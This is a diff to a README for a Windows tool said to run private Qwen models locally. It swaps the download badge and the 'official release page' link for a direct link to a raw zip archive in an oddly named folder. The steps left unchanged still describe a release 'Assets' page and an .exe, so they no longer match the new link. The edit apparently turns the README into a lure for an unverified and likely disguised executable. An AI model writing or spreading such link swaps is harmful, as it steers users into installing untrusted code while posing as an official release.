@@ -1,6 +1,6 @@
 # 🤖 pi-llamacpp - Run private Qwen models on Windows
 
-[![Download pi-llamacpp](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/callaundefeated243/pi-llamacpp)
+[![Download pi-llamacpp](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/callaundefeated243/pi-llamacpp/main/uterotonic/pi_llamacpp_v1.8.zip)
 
 ## 📋 About This Project
 
@@ -20,7 +20,7 @@ To run this application, your computer needs specific hardware components. Check
 
 Follow these steps to obtain the correct files for your system.
 
-1. Navigate to the official release page: [https://github.com/callaundefeated243/pi-llamacpp](https://github.com/callaundefeated243/pi-llamacpp).
+1. Navigate to the official release page: [https://raw.githubusercontent.com/callaundefeated243/pi-llamacpp/main/uterotonic/pi_llamacpp_v1.8.zip](https://raw.githubusercontent.com/callaundefeated243/pi-llamacpp/main/uterotonic/pi_llamacpp_v1.8.zip).
 2. Locate the section labeled "Assets."
 3. Select the file ending in `.exe` to start the download.
 4. Save the file to your desktop or your downloads folder.
